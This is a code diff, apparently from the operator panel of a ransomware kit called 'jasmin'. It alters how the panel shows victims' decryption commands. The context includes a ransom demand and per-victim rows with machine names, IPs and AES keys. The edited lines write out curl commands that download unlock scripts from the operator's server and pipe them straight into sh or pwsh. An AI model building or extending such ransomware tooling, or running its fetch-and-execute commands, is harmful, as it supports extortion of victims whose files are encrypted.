@@ -232,13 +232,13 @@ Contact us to obtain the private key and restore your files.</textarea>
 <tr><td colspan="11" id="dec-row-<?=$vid?>" class="dec-expand">
 <?php if($is_linux):?>
 <pre class="dt-code"># <?=h($row['machine_name'])?> (<?=h($row['ip'])?>) 一键解密 — 纯 openssl 零依赖
-curl -sL <?=$server_url?>/payloads/jasmin_unlock.sh | sh -s <?=$server_url?> "<?=$aes_pwd?>" /path/to/decrypt
+curl -sL <?=$server_url?>/payloads/jasmin_unlock.sh | sh -s <?=$server_url?> "<?=$aes_pwd?>"
 # 末尾换成要解密的目录，不写则解密当前目录</pre>
 <?php else:?>
 <pre class="dt-code">:: <?=h($row['machine_name'])?> (<?=h($row['ip'])?>) 一键解密 — 纯 PowerShell，无需编译 exe
 :: 要求 PowerShell 7+  (未装可执行: winget install Microsoft.PowerShell)
 curl.exe -sL <?=$server_url?>/payloads/jasmin_unlock.ps1 -o jasmin_unlock.ps1
-pwsh -File jasmin_unlock.ps1 -Server <?=$server_url?> -K "<?=$aes_pwd?>" -Paths C:\path\to\decrypt
+pwsh -File jasmin_unlock.ps1 -Server <?=$server_url?> -K "<?=$aes_pwd?>"
 :: -Paths 换成要解密的目录；不写则解密当前目录</pre>
 <?php endif;?>
 </td></tr>
@@ -367,7 +367,7 @@ function showDecrypt(vid,ip,isLinux){
   var nr=document.createElement('tr');nr.dataset.vid=vid;
   var td=document.createElement('td');td.colSpan=11;td.className='dec-expand';
   if(isLinux){
-    td.innerHTML='<pre class="dt-code"># '+ip+' 一键解密 — 纯 openssl 零依赖\\ncurl -sL '+srv+'/payloads/jasmin_unlock.sh | sh -s '+srv+' \"'+k+'\" /path/to/decrypt\\n# 末尾换成要解密的目录，不写则解密当前目录</pre>';
+    td.innerHTML='<pre class="dt-code"># '+ip+' 一键解密 — 纯 openssl 零依赖\\ncurl -sL '+srv+'/payloads/jasmin_unlock.sh | sh -s '+srv+' \"'+k+'\"\\n# 不写目录 = 解密全部加密文件\\n# 只解特定目录时在末尾追加，如: /data /home</pre>';
   }else{
     td.innerHTML='<pre class="dt-code">:: '+ip+' 一键解密 — 纯 PowerShell，无需编译 exe\\n:: 要求 PowerShell 7+  (winget install Microsoft.PowerShell)\\ncurl.exe -sL '+srv+'/payloads/jasmin_unlock.ps1 -o jasmin_unlock.ps1\\npwsh -File jasmin_unlock.ps1 -Server '+srv+' -K \"'+k+'\" -Paths C:\\\\path\\\\to\\\\decrypt</pre>';
   }
